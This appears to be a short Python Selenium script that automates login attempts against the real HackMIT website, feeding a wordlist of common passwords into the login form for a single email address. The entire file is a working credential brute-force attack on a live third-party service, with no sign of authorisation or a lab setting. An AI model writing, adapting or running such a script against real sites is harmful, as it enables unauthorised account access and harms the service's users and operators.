# This can connect to the HackMIT website and perform automatic login attempts. This file is 
#  configured to use only one email and a list of passwords.

from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
import time

# Populating list of common passwords found from the web
passwordFile = open('wordlist\passwordsSecret.txt', 'r')
passWords = passwordFile.readlines()
passwordFile.close()

driver = webdriver.Chrome()
driver.get('https://my.hackmit.org/')

time.sleep(5.0)

# This for loop is responsible attempting to login to the website with each of the provide passwords
for i in passWords:
  emailField = driver.find_element(By.CSS_SELECTOR, "#root > div > div > div > form > div:nth-child(1) > div > div > input[type=email]")
  emailField.send_keys(Keys.CONTROL + 'a', Keys.BACKSPACE) # This is here to delete field contents before trying new email
  emailField.send_keys("dummy@gmail.com") # This is what is being typed into the email input field


  passField = driver.find_element(By.CSS_SELECTOR, "#root > div > div > div > form > div:nth-child(2) > div.field > div > input[type=password]")
  passField.send_keys(Keys.CONTROL + 'a', Keys.BACKSPACE)
  passField.send_keys(i) # This is what is being typed into the password input field

  submitLogin = driver.find_element(By.CSS_SELECTOR, "#root > div > div > div > form > button")
  submitLogin.click()

time.sleep(5.0)

driver.quit()
